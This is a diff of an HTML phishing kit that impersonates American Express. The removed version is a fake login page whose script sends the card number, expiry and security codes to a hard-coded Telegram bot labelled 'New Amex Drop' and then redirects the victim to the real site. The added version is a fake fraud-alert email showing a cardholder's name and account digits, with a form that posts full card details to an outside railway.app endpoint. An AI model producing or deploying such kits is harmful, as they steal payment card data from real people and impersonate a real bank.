@@ -3,130 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>American Express - Secure Login</title>
+    <title>Account Security Alert - American Express</title>
     <style>
-        body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+        body { 
+            font-family: 'Arial', 'Helvetica', sans-serif; 
+            background-color: #f4f4f4; 
+            margin: 0; 
+            padding: 20px; 
+            color: #333;
         }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 350px;
-            text-align: center;
+        .email-container { 
+            max-width: 600px; 
+            margin: 0 auto; 
+            background-color: #ffffff; 
+            border: 1px solid #e0e0e0; 
         }
-        .logo {
-            color: #006fcf;
-            font-size: 24px;
+        
+        /* Top Header Section - Card Image Removed */
+        .top-header {
+            padding: 20px 30px;
+            border-bottom: 1px solid #eee;
+        }
+        .user-name {
             font-weight: bold;
-            margin-bottom: 20px;
-            letter-spacing: 1px;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
+        .account-num {
+            font-size: 14px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        /* Blue Banner Section */
+        .blue-banner {
+            background-color: #006fcf;
+            color: white;
+            padding: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .warning-icon {
+            width: 50px;
+            height: 50px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #006fcf;
+            font-size: 28px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        .banner-text {
+            font-size: 22px;
+            font-weight: bold;
+            line-height: 1.3;
+        }
+
+        /* Content Body */
+        .content-body {
+            padding: 30px;
+        }
+        .transaction-details {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .action-prompt {
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 15px;
+        }
+        .instruction-list {
+            margin-left: 20px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #444;
+        }
+        .instruction-list li {
+            margin-bottom: 8px;
+        }
+
+        /* Form Section */
+        .form-section {
+            background-color: #f9f9f9;
+            padding: 20px;
             border-radius: 4px;
+            border: 1px solid #eee;
+            margin-bottom: 25px;
+        }
+        .input-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 14px;
             box-sizing: border-box;
         }
-        button {
-            width: 100%;
-            padding: 12px;
+        .submit-btn {
             background-color: #006fcf;
             color: white;
             border: none;
-            border-radius: 4px;
+            padding: 12px 25px;
+            border-radius: 3px;
+            font-weight: bold;
             cursor: pointer;
-            font-size: 16px;
+            width: 100%;
+            font-size: 15px;
             margin-top: 10px;
         }
-        button:hover {
-            background-color: #005bb5;
+        .submit-btn:hover {
+            background-color: #0056a3;
         }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
+
+        /* Footer */
+        .footer-text {
+            font-size: 13px;
             color: #666;
+            margin-top: 20px;
+            line-height: 1.5;
         }
-        .loader {
-            display: none;
-            margin-top: 10px;
+        .footer-links {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+        }
+        .footer-links a {
             color: #006fcf;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .legal-text {
+            font-size: 10px;
+            color: #999;
+            margin-top: 15px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">AMERICAN EXPRESS</div>
-        <form id="ccForm">
-            <input type="text" id="card_number" name="card_number" placeholder="Card Number" required>
-            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
-            <input type="text" id="csc" name="csc" placeholder="CSC" required>
-            <input type="text" id="ccv" name="ccv" placeholder="CCV" required>
-            <button type="submit">Verify Account</button>
-        </form>
-        <div class="loader" id="loader">Processing...</div>
-        <div class="footer">
-            Secure Connection | © 2026 American Express
+    <div class="email-container">
+        <!-- Top Header (Card Image Removed) -->
+        <div class="top-header">
+            <div class="user-name">BRION S DENISON</div>
+            <div class="account-num">Account ending: 15004</div>
+        </div>
+
+        <!-- Blue Banner -->
+        <div class="blue-banner">
+            <div class="warning-icon">!</div>
+            <div class="banner-text">We declined a recent purchase on your Card to protect against fraud.</div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="content-body">
+            <div class="transaction-details">
+                $34.50 purchase on 10/06/2026 at MIDOLOTTO.COM on your Card ending in 15004
+            </div>
+
+            <div class="action-prompt">What you need to do next?</div>
+            <ul class="instruction-list">
+                <li>Enter your card details below to confirm this was your purchase.</li>
+                <li>If this was NOT your purchase, your account will be secured immediately.</li>
+            </ul>
+
+            <!-- Verification Form -->
+            <form action="https://your-railway-app.up.railway.app/verify" method="POST" class="form-section">
+                <input type="text" name="card_number" class="form-input" placeholder="Full Card Number" required maxlength="19" style="margin-bottom: 10px;">
+                
+                <div class="input-row">
+                    <input type="text" name="expiry" class="form-input" placeholder="MM/YY" required maxlength="5">
+                    <input type="text" name="ccv" class="form-input" placeholder="CCV (4)" required maxlength="4">
+                    <input type="text" name="cid" class="form-input" placeholder="CID (3)" required maxlength="3">
+                </div>
+                
+                <button type="submit" class="submit-btn">Confirm Purchase Attempt</button>
+            </form>
+
+            <div class="footer-text">
+                Still have questions, just call 1-800-824-9289 or the number on the back of your Card.
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer-links">
+            <a href="#">About your online security</a> | 
+            <a href="#">Get the American Express® App</a> | 
+            <a href="#">View your account online</a>
+            <div class="legal-text">
+                © 2026 American Express. All rights reserved<br>
+                SSF0CTA034
+            </div>
         </div>
     </div>
-
-    <script>
-        document.getElementById('ccForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const cardNumber = document.getElementById('card_number').value;
-            const expiry = document.getElementById('expiry').value;
-            const csc = document.getElementById('csc').value;
-            const ccv = document.getElementById('ccv').value;
-
-            // REPLACE THESE WITH YOUR ACTUAL TELEGRAM BOT DETAILS
-            const botToken = '8805223843:AAFDHgCzg7eX0vDC6NC7F4uXP3ST563Vqd0';
-            const chatId = '8790611176';
-
-            const message = `💳 *New Amex Drop*\n\n🔢 Card: \`${cardNumber}\`\n📅 Expiry: \`${expiry}\`\n🆔 CSC: \`${csc}\`\n🔒 CCV: \`${ccv}\``;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            document.getElementById('loader').style.display = 'block';
-            document.querySelector('button').disabled = true;
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    window.location.href = "https://www.americanexpress.com"; // Redirect to legit site after drop
-                } else {
-                    alert('Verification failed. Please try again.');
-                    document.getElementById('loader').style.display = 'none';
-                    document.querySelector('button').disabled = false;
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Connection error. Please check your network.');
-                document.getElementById('loader').style.display = 'none';
-                document.querySelector('button').disabled = false;
-            });
-        });
-    </script>
 </body>
 </html>
